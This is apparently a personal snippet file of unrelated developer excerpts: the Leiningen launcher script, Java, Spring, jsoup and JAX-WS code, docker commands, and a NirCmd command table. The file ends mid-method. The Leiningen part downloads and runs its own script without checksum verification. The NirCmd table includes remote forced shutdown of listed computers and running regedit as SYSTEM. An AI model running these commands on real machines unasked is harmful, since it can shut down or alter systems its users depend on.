    echo -n "$(sh -c "(cd $1 2</dev/null && pwd -W) || echo $1 | sed 's/^\\/\([a-z]\)/\\1:/g'")"
    else
    echo -n "$1"
    fi
}

#  usage : add_path PATH_VAR [PATH]...
function add_path {
    local path_var="$1"
    shift
    while [ -n "$1" ];do
        # http://bashify.com/?Useful_Techniques:Indirect_Variables:Indirect_Assignment
        if [[ -z ${!path_var} ]]; then
          export ${path_var}="$(make_native_path "$1")"
        else
          export ${path_var}="${!path_var}${delimiter}$(make_native_path "$1")"
        fi
    shift
    done
}

function download_failed_message {
    echo "Failed to download $1 (exit code $2)"
    echo "It's possible your HTTP client's certificate store does not have the"
    echo "correct certificate authority needed. This is often caused by an"
    echo "out-of-date version of libssl. It's also possible that you're behind a"
    echo "firewall and haven't set HTTP_PROXY and HTTPS_PROXY."
}

function self_install {
  if [ -r "$LEIN_JAR" ]; then
    echo "The self-install jar already exists at $LEIN_JAR."
    echo "If you wish to re-download, delete it and rerun \"$0 self-install\"."
    exit 1
  fi
  echo "Downloading Leiningen to $LEIN_JAR now..."
  mkdir -p "$(dirname "$LEIN_JAR")"
  LEIN_URL="https://github.com/technomancy/leiningen/releases/download/$LEIN_VERSION/leiningen-$LEIN_VERSION-standalone.zip"
  $HTTP_CLIENT "$LEIN_JAR.pending" "$LEIN_URL"
  local exit_code=$?
  if [ $exit_code == 0 ]; then
      # TODO: checksum
      mv -f "$LEIN_JAR.pending" "$LEIN_JAR"
  else
      rm "$LEIN_JAR.pending" 2> /dev/null
      download_failed_message "$LEIN_URL" "$exit_code"
      exit 1
  fi
}

function check_root {
  local -i user_id
  # Thank you for the complexity, Solaris
  if [ `uname` = "SunOS" -a -x /usr/xpg4/bin/id ]; then
    user_id=$(/usr/xpg4/bin/id -u 2>/dev/null || echo 0)
  else
    user_id=$(id -u 2>/dev/null || echo 0)
  fi
  [ $user_id -eq 0 -a "$LEIN_ROOT" = "" ] && return 0
  return 1
}

if check_root; then
    echo "WARNING: You're currently running as root; probably by accident."
    echo "Press control-C to abort or Enter to continue as root."
    echo "Set LEIN_ROOT to disable this warning."
    read _
fi

NOT_FOUND=1
ORIGINAL_PWD="$PWD"
while [ ! -r "$PWD/project.clj" ] && [ "$PWD" != "/" ] && [ $NOT_FOUND -ne 0 ]
do
    cd ..
    if [ "$(dirname "$PWD")" = "/" ]; then
        NOT_FOUND=0
        cd "$ORIGINAL_PWD"
    fi
done

export LEIN_HOME="${LEIN_HOME:-"$HOME/.lein"}"

for f in "/etc/leinrc" "$LEIN_HOME/leinrc" ".leinrc"; do
  if [ -e "$f" ]; then
    source "$f"
  fi
done

if $cygwin; then
    export LEIN_HOME=$(cygpath -w "$LEIN_HOME")
fi

LEIN_JAR="$LEIN_HOME/self-installs/leiningen-$LEIN_VERSION-standalone.jar"

# normalize $0 on certain BSDs
if [ "$(dirname "$0")" = "." ]; then
    SCRIPT="$(which "$(basename "$0")")"
    if [ -z "$SCRIPT" ]; then
        SCRIPT="$0"
    fi
else
    SCRIPT="$0"
fi

# resolve symlinks to the script itself portably
while [ -h "$SCRIPT" ] ; do
    ls=$(ls -ld "$SCRIPT")
    link=$(expr "$ls" : '.*-> \(.*\)$')
    if expr "$link" : '/.*' > /dev/null; then
        SCRIPT="$link"
    else
        SCRIPT="$(dirname "$SCRIPT"$)/$link"
    fi
done

BIN_DIR="$(dirname "$SCRIPT")"

export LEIN_JVM_OPTS="${LEIN_JVM_OPTS-"-XX:+TieredCompilation -XX:TieredStopAtLevel=1"}"

# This needs to be defined before we call HTTP_CLIENT below
if [ "$HTTP_CLIENT" = "" ]; then
    if type -p curl >/dev/null 2>&1; then
        if [ "$https_proxy" != "" ]; then
            CURL_PROXY="-x $https_proxy"
        fi
        HTTP_CLIENT="curl $CURL_PROXY -f -L -o"
    else
        HTTP_CLIENT="wget -O"
    fi
fi


# When :eval-in :classloader we need more memory
grep -E -q '^\s*:eval-in\s+:classloader\s*$' project.clj 2> /dev/null && \
    export LEIN_JVM_OPTS="$LEIN_JVM_OPTS -Xms64m -Xmx512m"

if [ -r "$BIN_DIR/../src/leiningen/version.clj" ]; then
    # Running from source checkout
    LEIN_DIR="$(dirname "$BIN_DIR")"

    # Need to use lein release to bootstrap the leiningen-core library (for aether)
    if [ ! -r "$LEIN_DIR/leiningen-core/.lein-bootstrap" ]; then
        echo "Leiningen is missing its dependencies."
        echo "Please run \"lein bootstrap\" in the leiningen-core/ directory"
        echo "with a stable release of Leiningen. See CONTRIBUTING.md for details."
        exit 1
    fi

    # If project.clj for lein or leiningen-core changes, we must recalculate
    LAST_PROJECT_CHECKSUM=$(cat "$LEIN_DIR/.lein-project-checksum" 2> /dev/null)
    PROJECT_CHECKSUM=$(sum "$LEIN_DIR/project.clj" "$LEIN_DIR/leiningen-core/project.clj")
    if [ "$PROJECT_CHECKSUM" != "$LAST_PROJECT_CHECKSUM" ]; then
        if [ -r "$LEIN_DIR/.lein-classpath" ]; then
            rm "$LEIN_DIR/.lein-classpath"
        fi
    fi

    # Use bin/lein to calculate its own classpath.
    if [ ! -r "$LEIN_DIR/.lein-classpath" ] && [ "$1" != "classpath" ]; then
        echo "Recalculating Leiningen's classpath."
        ORIG_PWD="$PWD"
        cd "$LEIN_DIR"

        LEIN_NO_USER_PROFILES=1 $0 classpath .lein-classpath
        sum "$LEIN_DIR/project.clj" "$LEIN_DIR/leiningen-core/project.clj" > \
            .lein-project-checksum
        cd "$ORIG_PWD"
    fi

    mkdir -p "$LEIN_DIR/target/classes"
    export LEIN_JVM_OPTS="$LEIN_JVM_OPTS -Dclojure.compile.path=$LEIN_DIR/target/classes"
    add_path CLASSPATH "$LEIN_DIR/leiningen-core/src/" "$LEIN_DIR/leiningen-core/resources/" \
        "$LEIN_DIR/test:$LEIN_DIR/target/classes" "$LEIN_DIR/src" ":$LEIN_DIR/resources"

    if [ -r "$LEIN_DIR/.lein-classpath" ]; then
        add_path CLASSPATH "$(cat "$LEIN_DIR/.lein-classpath" 2> /dev/null)"
    else
        add_path CLASSPATH "$(cat "$LEIN_DIR/leiningen-core/.lein-bootstrap" 2> /dev/null)"
    fi
else # Not running from a checkout
    add_path CLASSPATH "$LEIN_JAR"

    BOOTCLASSPATH="-Xbootclasspath/a:$LEIN_JAR"

    if [ ! -r "$LEIN_JAR" -a "$1" != "self-install" ]; then
        self_install
    fi
fi

if [ ! -x "$JAVA_CMD" ] && ! type -f java >/dev/null
then
    >&2 echo "Leiningen coundn't find 'java' executable, which is required."
    >&2 echo "Please either set JAVA_CMD or put java (>=1.6) in your \$PATH ($PATH)."
    exit 1
fi

export LEIN_JAVA_CMD="${LEIN_JAVA_CMD:-${JAVA_CMD:-java}}"

if [[ -z "${DRIP_INIT+x}" && "$(basename "$LEIN_JAVA_CMD")" == *drip* ]]; then
    export DRIP_INIT="$(printf -- '-e\n(require (quote leiningen.repl))')"
    export DRIP_INIT_CLASS="clojure.main"
fi

# Support $JAVA_OPTS for backwards-compatibility.
export JVM_OPTS="${JVM_OPTS:-"$JAVA_OPTS"}"

# Handle jline issue with cygwin not propagating OSTYPE through java subprocesses: https://github.com/jline/jline2/issues/62
cygterm=false
if $cygwin; then
  case "$TERM" in
    rxvt* | xterm* | vt*) cygterm=true ;;
  esac
fi

if $cygterm; then
  LEIN_JVM_OPTS="$LEIN_JVM_OPTS -Djline.terminal=jline.UnixTerminal"
  stty -icanon min 1 -echo > /dev/null 2>&1
fi

# TODO: investigate http://skife.org/java/unix/2011/06/20/really_executable_jars.html
# If you're packaging this for a package manager (.deb, homebrew, etc)
# you need to remove the self-install and upgrade functionality or see lein-pkg.
if [ "$1" = "self-install" ]; then
    if [ -r "$BIN_DIR/../src/leiningen/version.clj" ]; then
        echo "Running self-install from a checkout is not supported."
        echo "See CONTRIBUTING.md for SNAPSHOT-specific build instructions."
        exit 1
    fi
    echo "Manual self-install is deprecated; it will run automatically when necessary."
    self_install
elif [ "$1" = "upgrade" ] || [ "$1" = "downgrade" ]; then
    if [ "$LEIN_DIR" != "" ]; then
        echo "The upgrade task is not meant to be run from a checkout."
        exit 1
    fi
    if [ $SNAPSHOT = "YES" ]; then
        echo "The upgrade task is only meant for stable releases."
        echo "See the \"Bootstrapping\" section of CONTRIBUTING.md."
        exit 1
    fi
    if [ ! -w "$SCRIPT" ]; then
        echo "You do not have permission to upgrade the installation in $SCRIPT"
        exit 1
    else
        TARGET_VERSION="${2:-stable}"
        echo "The script at $SCRIPT will be upgraded to the latest $TARGET_VERSION version."
        echo -n "Do you want to continue [Y/n]? "
        read RESP
        case "$RESP" in
            y|Y|"")
                echo
                echo "Upgrading..."
                TARGET="/tmp/lein-$$-upgrade"
                if $cygwin; then
                    TARGET=$(cygpath -w "$TARGET")
                fi
                LEIN_SCRIPT_URL="https://github.com/technomancy/leiningen/raw/$TARGET_VERSION/bin/lein"
                $HTTP_CLIENT "$TARGET" "$LEIN_SCRIPT_URL"
                if [ $? == 0 ]; then
                    cmp -s "$TARGET" "$SCRIPT"
                    if [ $? == 0 ]; then
                        echo "Leiningen is already up-to-date."
                    fi
                    mv "$TARGET" "$SCRIPT" && chmod +x "$SCRIPT"
                    exec "$SCRIPT" version
                else
                    download_failed_message "$LEIN_SCRIPT_URL"
                fi;;
            *)
                echo "Aborted."
                exit 1;;
        esac
    fi
else
    if $cygwin; then
        # When running on Cygwin, use Windows-style paths for java
        ORIGINAL_PWD=$(cygpath -w "$ORIGINAL_PWD")
    fi

    # apply context specific CLASSPATH entries
    if [ -f .lein-classpath ]; then
        add_path CLASSPATH "$(cat .lein-classpath)"
    fi

    if [ -n "$DEBUG" ]; then
        echo "Leiningen's classpath: $CLASSPATH"
    fi

    if [ -r .lein-fast-trampoline ]; then
        export LEIN_FAST_TRAMPOLINE='y'
    fi

    if [ "$LEIN_FAST_TRAMPOLINE" != "" ] && [ -r project.clj ]; then
        INPUTS="$* $(cat project.clj) $LEIN_VERSION $(test -f "$LEIN_HOME/profiles.clj" && cat "$LEIN_HOME/profiles.clj")"

        if command -v shasum >/dev/null 2>&1; then
            SUM="shasum"
        elif command -v sha1sum >/dev/null 2>&1; then
            SUM="sha1sum"
        else
            command_not_found "sha1sum or shasum"
        fi

        export INPUT_CHECKSUM=$(echo "$INPUTS" | $SUM | cut -f 1 -d " ")
        # Just don't change :target-path in project.clj, mkay?
        TRAMPOLINE_FILE="target/trampolines/$INPUT_CHECKSUM"
    else
        if hash mktemp 2>/dev/null; then
            # Check if mktemp is available before using it
            TRAMPOLINE_FILE="$(mktemp /tmp/lein-trampoline-XXXXXXXXXXXXX)"
        else
            TRAMPOLINE_FILE="/tmp/lein-trampoline-$$"
        fi
        trap "rm -f $TRAMPOLINE_FILE" EXIT
    fi

    if $cygwin; then
        TRAMPOLINE_FILE=$(cygpath -w "$TRAMPOLINE_FILE")
    fi

    if [ "$INPUT_CHECKSUM" != "" ] && [ -r "$TRAMPOLINE_FILE" ]; then
        if [ -n "$DEBUG" ]; then
            echo "Fast trampoline with $TRAMPOLINE_FILE."
        fi
        exec sh -c "exec $(cat "$TRAMPOLINE_FILE")"
    else
        export TRAMPOLINE_FILE
        "$LEIN_JAVA_CMD" \
            "${BOOTCLASSPATH[@]}" \
            -Dfile.encoding=UTF-8 \
            -Dmaven.wagon.http.ssl.easy=false \
            -Dmaven.wagon.rto=10000 \
            $LEIN_JVM_OPTS \
            -Dleiningen.original.pwd="$ORIGINAL_PWD" \
            -Dleiningen.script="$SCRIPT" \
            -classpath "$CLASSPATH" \
            clojure.main -m leiningen.core.main "$@"

        EXIT_CODE=$?

        if $cygterm ; then
          stty icanon echo > /dev/null 2>&1
        fi

        ## TODO: [ -r "$TRAMPOLINE_FILE" ] may be redundant? A trampoline file
        ## is always generated these days.
        if [ -r "$TRAMPOLINE_FILE" ] && [ "$LEIN_TRAMPOLINE_WARMUP" = "" ]; then
            TRAMPOLINE="$(cat "$TRAMPOLINE_FILE")"
            if [ "$INPUT_CHECKSUM" = "" ]; then
                rm "$TRAMPOLINE_FILE"
            fi
            if [ "$TRAMPOLINE" = "" ]; then
                exit $EXIT_CODE
            else
                exec sh -c "exec $TRAMPOLINE"
            fi
        else
            exit $EXIT_CODE
        fi
    fi
fi
--------------------------------------------------------------------------------------------------------
MessageFormat format = new MessageFormat("The number is {0, number}", Locale.GERMAN);
String s = format.format(new Object[] {number});
--------------------------------------------------------------------------------------------------------
// class name is awful for this example, but it will make more sense if you
//  read further
public interface MetaDataKey<T extends Serializable> extends Serializable
{
    T getValue();
}

public final class TypeSafeKeys
{
    static enum StringKeys implements MetaDataKey<String>
    {
        A1("key1");

        private final String value;

        StringKeys(String value) { this.value = value; }

        @Override
        public String getValue() { return value; }
    }

    static enum IntegerKeys implements MetaDataKey<Integer>
    {
        A2(0);

        private final Integer value;

        IntegerKeys (Integer value) { this.value = value; }

        @Override
        public Integer getValue() { return value; }
    }

    public static final MetaDataKey<String> A1 = StringKeys.A1;
    public static final MetaDataKey<Integer> A2 = IntegerKeys.A2;
}
--------------------------------------------------------------------------------------------------------
chrome://about/
--------------------------------------------------------------------------------------------------------
import java.util.HashMap;
import java.util.Map;

import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.EnableAutoConfiguration;
import org.springframework.boot.context.properties.ConfigurationProperties;
import org.springframework.boot.context.properties.EnableConfigurationProperties;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;

@Configuration
@EnableAutoConfiguration
@EnableConfigurationProperties
public class MapBindingSample {

    public static void main(String[] args) throws Exception {
        System.out.println(SpringApplication.run(MapBindingSample.class, args)
                .getBean(Test.class).getInfo());
    }

    @Bean
    @ConfigurationProperties
    public Test test() {
        return new Test();
    }

    public static class Test {

        private Map<String, Object> info = new HashMap<String, Object>();

        public Map<String, Object> getInfo() {
            return this.info;
        }
    }
}
--------------------------------------------------------------------------------------------------------
@Value("#{systemProperties['priority']}")
private String spelValue;

@Value("#{systemProperties['unknown'] ?: 'some default'}")
private String spelSomeDefault;

@Value("#{someBean.someValue}")
private Integer someBeanValue;

@Value("#{'${listOfValues}'.split(',')}")
private List<String> valuesList;

@Value("#{${valuesMap}}")
private Map<String, Integer> valuesMap;

@Value("#{${valuesMap}.key1}")
private Integer valuesMapKey1;

@Value("#{${unknownMap : {key1: '1', key2: '2'}}}")
private Map<String, Integer> unknownMap;
 
@Value("#{${valuesMap}['unknownKey'] ?: 5}")
private Integer unknownMapKeyWithDefaultValue;

@Value("#{${valuesMap}.?[value>'1']}")
private Map<String, Integer> valuesMapFiltered;

@Value("#{systemProperties}")
private Map<String, String> systemPropertiesMap;
--------------------------------------------------------------------------------------------------------
docker pull greenmail/standalone:1.5.10
docker run -t -i -p 3025:3025 -p 3110:3110 -p 3143:3143 \
                 -p 3465:3465 -p 3993:3993 -p 3995:3995 \
                 greenmail/standalone:1.5.10
docker run -t -i \
           -e GREENMAIL_OPTS='-Dgreenmail.setup.test.all -Dgreenmail.hostname=0.0.0.0 -Dgreenmail.auth.disabled -Dgreenmail.verbose' \
           -e JAVA_OPTS='-Djava.net.preferIPv4Stack=true -Xmx512m' \
           -p 3025:3025 -p 3110:3110 -p 3143:3143 \
           -p 3465:3465 -p 3993:3993 -p 3995:3995 \
           greenmail/standalone:1.5.4
--------------------------------------------------------------------------------------------------------
        <plugin>
          <!-- http://maven.apache.org/plugins/maven-surefire-plugin/plugin-info.html -->
          <artifactId>maven-surefire-plugin</artifactId>
          <version>3.0.0-M3</version>
          <configuration>
            <forkCount>1</forkCount>
            <reuseForks>true</reuseForks>
            <!-- cli -->
            <workingDirectory>target</workingDirectory>
            <!-- Fix https://talk.openmrs.org/t/error-could-not-find-or-load-main-class-org-apache-maven-surefire-booter-forkedbooter/20509 -->
            <argLine>-Djdk.net.URLClassPath.disableClassPathURLCheck=true</argLine>
          </configuration>
        </plugin>
--------------------------------------------------------------------------------------------------------
<argLine>-Xmx512m -enableassertions</argLine>
--------------------------------------------------------------------------------------------------------
https://www.ittsystems.com/wifi-analyzers-for-windows/
--------------------------------------------------------------------------------------------------------
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary=frontier

This is a message with multiple parts in MIME format.
--frontier
Content-Type: text/plain

This is the body of the message.
--frontier
Content-Type: application/octet-stream
Content-Transfer-Encoding: base64

PGh0bWw+CiAgPGhlYWQ+CiAgPC9oZWFkPgogIDxib2R5PgogICAgPHA+VGhpcyBpcyB0aGUg
Ym9keSBvZiB0aGUgbWVzc2FnZS48L3A+CiAgPC9ib2R5Pgo8L2h0bWw+Cg==
--frontier--
--------------------------------------------------------------------------------------------------------
Open the door of J: CD-ROM drive	nircmd.exe cdrom open j:
Close the door of Y: CD-ROM drive	nircmd.exe cdrom close y:
Speaks the text currently in the clipboard (For Windows XP/Vista/7/8).	speak text ~$clipboard$
Speaks the text stored inside speak.txt into speak.wav filename (For Windows XP/Vista/7/8).	speak file "c:\temp\speak.txt" 0 100 "c:\temp\speak.wav" 48kHz16BitStereo
Increase the system volume by 2000 units (out of 65535)	nircmd.exe changesysvolume 2000
Decrease the system volume by 5000 units (out of 65535)	nircmd.exe changesysvolume -5000
Set the volume to the highest value	nircmd.exe setsysvolume 65535
Mute the system volume	nircmd.exe mutesysvolume 1
Unmute the system volume	nircmd.exe mutesysvolume 0
Switch the system volume between the mute and normal state.	nircmd.exe mutesysvolume 2
Create a shortcut on your desktop that switch the system volume between the mute and normal state.	nircmd.exe cmdshortcut "~$folder.desktop$" "Switch Volume" mutesysvolume 2
Turn off the monitor	nircmd.exe monitor off
Start the default screen saver	nircmd.exe screensaver
Put your computer in 'standby' mode	nircmd.exe standby
log off the current user	nircmd.exe exitwin logoff
Ask if you want to reboot, and if you answer 'Yes', reboot the computer.	nircmd.exe qboxcom "Do you want to reboot ?" "question" exitwin reboot
Turn off your computer	nircmd.exe exitwin poweroff
Turn off all computers specified in computers.txt !	multiremote copy "c:\temp\computers.txt" exitwin poweroff force
Dial to "My Internet" connection	nircmd.exe rasdial "My Internet"
Disconnect the "My Internet" connection	nircmd.exe rashangup "My Internet"
Make your Internet Explorer windows 75% transparent ! (192 / 256)	nircmd.exe win trans ititle "internet explorer" 192
Minimize all your Internet Explorer windows	nircmd.exe win min class "IEFrame"
Close all your Internet Explorer windows	nircmd.exe win close class "IEFrame"
Close all your Explorer windows (My Computer, folders, and so on)	nircmd.exe win close class "CabinetWClass"
Hide all your Internet Explorer windows	nircmd.exe win hide class "IEFrame"
Show all your Internet Explorer windows (after you made them hidden with previous example)	nircmd.exe win show class "IEFrame"
Center all top-level windows	nircmd.exe win center alltop
Remove the title bar of My Computer window.	nircmd.exe win -style title "my computer" 0x00C00000
Return the title bar of My Computer window that we removed in the previous example.	nircmd.exe win +style title "my computer" 0x00C00000
Set the My Computer window to right-to-left order (For hebrew and arabic languages)	nircmd win +exstyle title "my computer" 0x00400000
Set all child windows of My Computer window to right-to-left order (For hebrew and arabic languages)	nircmd win child title "my computer" +exstyle all 0x00400000
Create a shortcut on your desktop that closes all your Internet Explorer windows	nircmd.exe cmdshortcut " "~$folder.desktop$ "Close All IE" win close class "IEFrame"
Create a shortcut on your desktop that hides all your Internet Explorer windows	nircmd.exe cmdshortcut " "~$folder.desktop$ "Hide All IE" win hide class "IEFrame"
Create a shortcut on your desktop that shows back all your Internet Explorer windows	nircmd.exe cmdshortcut " "~$folder.desktop$ "Show All IE" win show class "IEFrame"
Set the Windows Calculator as top-most window (above all other windows)	nircmd.exe win settopmost title "Calculator" 1
Set the Windows Calculator back to regular window (non top-most window)	nircmd.exe win settopmost title "Calculator" 0
Create a shortcut to Windows calculator under Start Menu->Programs->Calculators	nircmd.exe shortcut "f:\winnt\system32\calc.exe" "~$folder.programs$\Calculators" "Windows Calculator"
Hide the desktop window	nircmd.exe win hide class progman
Show the desktop window (After hiding it in previous example)	nircmd.exe win show class progman
Hide the start button on the system tray	nircmd.exe win child class "Shell_TrayWnd" hide class "button"
Show the start button on the system tray	nircmd.exe win child class "Shell_TrayWnd" show class "button"
Hide the clock on the system tray	nircmd.exe win child class "Shell_TrayWnd" hide class "TrayClockWClass"
Show the clock on the system tray	nircmd.exe win child class "Shell_TrayWnd" show class "TrayClockWClass"
Kill (terminate) all instance of Internet Explorer processes	nircmd.exe killprocess iexplore.exe
Create a shortcut on your desktop that opens the door of K: CDROM drive when you run it.	nircmd.exe cmdshortcut "~$folder.desktop$" "Open CDROM" cdrom open k:
Create a shortcut to NirSoft Web site on your desktop	nircmd.exe urlshortcut "http://www.nirsoft.net" "~$folder.desktop$" "NirSoft"
Add NirSoft Web site to your Favorities under Links folder.	nircmd.exe urlshortcut "http://www.nirsoft.net" "~$folder.favorites$\Links" "NirSoft"
Create a shortcut to NirSoft Web site on the desktop of all computers listed in computers.txt	nircmd.exe multiremote copy "c:\temp\computers.txt" urlshortcut "http://www.nirsoft.net" "~$folder.common_desktop$" "NirSoft"
Set the display mode to 800x600x24bit colors	nircmd.exe setdisplay 800 600 24
Create a shortcut on the desktop that set the display mode to 800x600x24bit colors	nircmd.exe cmdshortcut "~$folder.desktop$" "800x600x24" setdisplay 800 600 24
Copy all shortcuts on your desktop to another folder (f:\temp\desktop).	nircmd.exe execmd copy "~$folder.desktop$\*.lnk" f:\temp\desktop
Restart your Apache server (under Windows NT/2000/XP/2003)	nircmd.exe service restart apache
Create a shortcut on your desktop that restarts the Apache server	nircmd.exe cmdshortcut "~$folder.desktop$" "Restart Apache" service restart apache
Restart your IIS	nircmd.exe service restart w3svc
Restart MySql	nircmd.exe service restart MySql
Open the desired Registry key/value in RegEdit	nircmd.exe regedit "HKLM\Software\Microsoft\Windows\CurrentVersion" "CommonFilesDir"
Open the Registry key that you copied to the clipboard in RegEdit.	nircmd regedit "~$clipboard$"
Disable the screen saver	nircmd.exe regsetval sz "HKCU\control panel\desktop" "ScreenSaveActive" 0
Enable the screen saver	nircmd.exe regsetval sz "HKCU\control panel\desktop" "ScreenSaveActive" 1
Change the date/time of the specified filename (creation time and modified time)	nircmd.exe setfiletime "c:\temp\myfile.txt" "24-06-2003 17:57:11" "22-11-2005 10:21:56"
Copy your desktop folder path to the clipboard	nircmd.exe clipboard set ~$folder.desktop$
Copy your start menu folder path to the clipboard	nircmd.exe clipboard set ~$folder.start_menu$
Copy the content of info1.txt (simple text file) to the clipboard	nircmd.exe clipboard readfile "c:\My Files\info1.txt"
Add the text content of clipboard to info1.txt	nircmd.exe clipboard addfile "c:\My Files\info1.txt"
Clear the clipboard	nircmd.exe clipboard clear
Create all folders specified in "c:\temp\folders.txt". The folder path names are separated by CRLF characters.	nircmd.exe paramsfile "c:\temp\folders.txt" "" "" execmd md ~$fparam.1$
Install the specified .NET assembly in the global assembly cache (like gacutil)	nircmd.exe gac install "C:\temp\MyAssembly\bin\MyAssembly.dll"
Empty the recycle bin in all drives.	nircmd.exe emptybin
Answer 'Yes' to a standard Windows message-box.	nircmd.exe dlg "" "" click yes
Wait 2 seconds, and then save the current screen to shot.png	nircmd.exe cmdwait 2000 savescreenshot "f:\temp\shot.png"
Save 10 screenshots in a loop, and wait 60 seconds between the screenshot save calls. The filenames of the screenshot will contain the time and date of the saved screenshot.	nircmd.exe loop 10 60000 savescreenshot c:\temp\scr~$currdate.MM_dd_yyyy$-~$currtime.HH_mm_ss$.png
Wait until Firefox is closed, and then say "Firefox was closed"	nircmd.exe waitprocess firefox.exe speak text "Firefox was closed"
Run RegEdit with SYSTEM user (On Windows 7/8/Vista/2008), which allows you to view all hidden system Registry keys	nircmd.exe elevatecmd runassystem c:\windows\regedit.exe
--------------------------------------------------------------------------------------------------------
final String html = "<div>Hello jsoup world</div>";

Document doc = Jsoup.parse(html, "", Parser.xmlParser());
Element tag = doc;
--------------------------------------------------------------------------------------------------------
Document doc = Jsoup.connect("http://example.com").get();
doc.select("p").forEach(System.out::println);

Document docCustomConn = Jsoup.connect(blogUrl)
  .userAgent("Mozilla")
  .timeout(5000)
  .cookie("cookiename", "val234")
  .cookie("anothercookie", "ilovejsoup")
  .referrer("http://google.com")
  .header("headersecurity", "xyz123")
  .get();
  
Elements links = doc.select("a");
Elements sections = doc.select("section");
Elements logo = doc.select(".spring-logo--container");
Elements pagination = doc.select("#pagination_control");
Elements divsDescendant = doc.select("header div");
Elements divsDirect = doc.select("header > div");

Element pag = doc.getElementById("pagination_control");
Elements desktopOnly = doc.getElementsByClass("desktopOnly");

Element firstSection = sections.first();
Element lastSection = sections.last();
Element secondSection = sections.get(2);
Elements allParents = firstSection.parents();
Element parent = firstSection.parent();
Elements children = firstSection.children();
Elements siblings = firstSection.siblingElements();


Elements sectionParagraphs = firstSection.select(".paragraph");
Element firstArticle = doc.select("article").first();
Element timeElement = firstArticle.select("time").first();
String dateTimeOfFirstArticle = timeElement.attr("datetime");
Element sectionDiv = firstArticle.select("section div").first();
String sectionDivText = sectionDiv.text();
String articleHtml = firstArticle.html();
String outerHtml = firstArticle.outerHtml();


timeElement.attr("datetime", "2016-12-16 15:19:54.3");
sectionDiv.text("foo bar");
firstArticle.select("h2").html("<div><span></span></div>");

Element link = new Element(Tag.valueOf("a"), "")
  .text("Checkout this amazing website!")
  .attr("href", "http://baeldung.com")
  .attr("target", "_blank");
firstArticle.appendChild(link);


doc.select("li.navbar-link").remove();
firstArticle.select("img").remove();
--------------------------------------------------------------------------------------------------------
private void convertTablesToLists(final Document document) {
 // If a two column table, where the first col is always the same (and non-alphabetic), then drop
 // it and convert the other row to a list.
 document.select("table").forEach(table -> {
  String firstColumnValue = null;
  for (final Element tr : table.select("tr")) {
   final Elements cells = tr.select("td");
   if (cells.size() != 2) {
    return;
   }
   final Element cell = cells.first();
   final String first = cell.text().trim();
   if (firstColumnValue != null) {
    if (!firstColumnValue.equals(first)) {
     return;
    }
   } else {
    firstColumnValue = first;
   }
  }
  // If we are here then all the first columns are the same...
  // So we convert to a list...
  final Element ul = new Element(Tag.valueOf("ul"), "");
  for (final Element tr : table.select("tr")) {
   final Elements cells = tr.select("td");
   ul.appendElement("li").html(cells.last().html());
  }
  table.replaceWith(ul);
 });
}

 import org.jsoup.*;
import org.jsoup.nodes.*;
import org.jsoup.select.*;

public class MyJsoupExample {
  public static void main(String args[]) {
    String inputText = "<html><head></head><body><p><img src=\"getCustomers.do?custCode=2&customerId=3334&param1=123\"/></p>"
      + "<p>someText <img src=\"getCustomers.do?custCode=2&customerId=3340&param2=456\"/></p></body></html>";
    Document doc = Jsoup.parse(inputText);
    Elements myImgs = doc.select("img[src*=customerId=3340");
    for (Element element : myImgs) {
      element.replaceWith(new TextNode("my replaced text", ""));
    }
    System.out.println(doc.toString());
  }
}

private Element changeElementTag(Element e, String newTag) {
  Element newElement = document.createElement(newTag);
  /* JSoup gives us the live child list, so we need to make a copy. */
  List<Node> copyOfChildNodeList = new ArrayList<Node>();
  copyOfChildNodeList.addAll(e.childNodes());
  for (Node n : copyOfChildNodeList) {
    n.remove();
    newElement.appendChild(n);
  }
  e.replaceWith(newElement);
  return newElement;
}
--------------------------------------------------------------------------------------------------------
import javax.xml.bind.annotation.XmlAccessType;
import javax.xml.bind.annotation.XmlAccessorType;
import javax.xml.bind.annotation.XmlElement;
import javax.xml.bind.annotation.XmlType;


/**
 * <p>Java class for updateEmployeeResponse complex type.
 * 
 * <p>The following schema fragment specifies the expected content contained within this class.
 * 
 * <pre>
 * &lt;complexType name="updateEmployeeResponse">
 *   &lt;complexContent>
 *     &lt;restriction base="{http://www.w3.org/2001/XMLSchema}anyType">
 *       &lt;sequence>
 *         &lt;element name="return" type="{http://bottomup.server.jaxws.baeldung.com/}employee" minOccurs="0"/>
 *       &lt;/sequence>
 *     &lt;/restriction>
 *   &lt;/complexContent>
 * &lt;/complexType>
 * </pre>
 * 
 * 
 */
@XmlAccessorType(XmlAccessType.FIELD)
@XmlType(name = "updateEmployeeResponse", propOrder = {
    "_return"
})
public class UpdateEmployeeResponse {

    @XmlElement(name = "return")
    protected Employee _return;

    /**
     * Gets the value of the return property.
     * 
     * @return
     *     possible object is
     *     {@link Employee }
     *     
     */
    public Employee getReturn() {
        return _return;
    }

    /**
     * Sets the value of the return property.
     * 
     * @param value
     *     allowed object is
     *     {@link Employee }
     *     
     */
    public void setReturn(Employee value) {
        this._return = value;
    }
}
--------------------------------------------------------------------------------------------------------
import java.util.List;
import javax.jws.WebMethod;
import javax.jws.WebParam;
import javax.jws.WebResult;
import javax.jws.WebService;
import javax.xml.bind.annotation.XmlSeeAlso;
import javax.xml.ws.Action;
import javax.xml.ws.FaultAction;
import javax.xml.ws.RequestWrapper;
import javax.xml.ws.ResponseWrapper;


/**
 * This class was generated by the JAX-WS RI.
 * JAX-WS RI 2.2.9-b130926.1035
 * Generated source version: 2.2
 * 
 */
@WebService(name = "EmployeeService", targetNamespace = "http://bottomup.server.jaxws.baeldung.com/")
@XmlSeeAlso({
    ObjectFactory.class
})
public interface EmployeeService {


    /**
     * 
     * @param arg0
     * @return
     *     returns com.baeldung.jaxws.client.Employee
     * @throws EmployeeNotFound_Exception
     */
    @WebMethod
    @WebResult(targetNamespace = "")
    @RequestWrapper(localName = "getEmployee", targetNamespace = "http://bottomup.server.jaxws.baeldung.com/", className = "com.baeldung.jaxws.client.GetEmployee")
    @ResponseWrapper(localName = "getEmployeeResponse", targetNamespace = "http://bottomup.server.jaxws.baeldung.com/", className = "com.baeldung.jaxws.client.GetEmployeeResponse")
    @Action(input = "http://bottomup.server.jaxws.baeldung.com/EmployeeService/getEmployeeRequest", output = "http://bottomup.server.jaxws.baeldung.com/EmployeeService/getEmployeeResponse", fault = {
        @FaultAction(className = EmployeeNotFound_Exception.class, value = "http://bottomup.server.jaxws.baeldung.com/EmployeeService/getEmployee/Fault/EmployeeNotFound")
    })
    public Employee getEmployee(
